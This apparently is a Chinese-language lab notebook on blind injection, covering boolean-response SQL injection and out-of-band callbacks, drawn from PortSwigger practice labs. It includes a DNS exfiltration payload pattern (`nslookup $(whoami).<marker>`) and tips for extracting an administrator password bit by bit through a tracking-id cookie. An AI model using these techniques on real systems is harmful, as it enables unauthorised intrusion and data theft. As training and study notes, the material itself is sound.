---
title: 盲注入族:布尔预言机与 OOB 信道
---

# 盲注入族:布尔预言机与 OOB 信道

同一类型漏洞:注入无回显。族内按 oracle 信道分:布尔条件响应(行为差)、
出网外呼(OOB)。共性成因是无回显时需把「真假/数据」编码进另一条可见信道。

## 子型判型矩阵

| 子型 | 判型特征 | 手法方向 | 实录 |
|---|---|---|---|
| 布尔条件响应 | 响应文案随条件变(如 `Welcome back!`) | 按位并发试字符,`blind_oracle` 抽串 | [[lab-conditional-responses]] |
| 出网外呼(交互) | 命令异步、无回显 | `nslookup`/HTTP 回调到 Collaborator | [[lab-blind-out-of-band]] |
| 出网外呼(外带) | 同上,需取回命令输出 | `nslookup $(whoami).<marker>` 外带 | [[lab-blind-out-of-band-data-exfiltration]] |

## 关键坑(实录)

- **布尔盲 SQLi 的 WHERE 必须先匹配一行**:payload 前缀要用服务端已入库的真实
  tracking id,否则条件恒假、零命中;users 表值大小写敏感(`username='administrator'` 小写)。
- lab 出站到**自建 OOB 域不可达**(PortSwigger 仅放行官方 Collaborator),40+ 载荷零命中;
  自建 `oob.dthack.io` 底座对**本机发起**通、对 lab 发起不通——属平台边界,非注入面问题。
  详见 [[oob-callback-family]]。
- 用 `--header 'Cookie: …'` 覆盖 jar 会失败(lab_http jar cookie 后写),改用把 cookie 写进 jar。

## 工具面

- `blind_oracle`:模板含 `{I}`/`{C}`,按响应标记判真假,`--place cookie|header|body|query`,并发逐字符。
- `lab_http`、`solved_check`;OOB 底座读日志见 [[oob-callback-family]]。

## 判定与收尾要点

- 判定锚点:抽出目标数据(口令)并闭环使用;OOB 须见 lab 源回调(本批被平台挡)。
- 先证 oracle 存在(单字符真/假),再逐位提取,不做无目标全量拖取。

## 相关族

- OOB 基建见 [[oob-callback-family]];头/参数注入面见 [[ssrf-family]];方法论:web-vuln-methods(按名引用)。
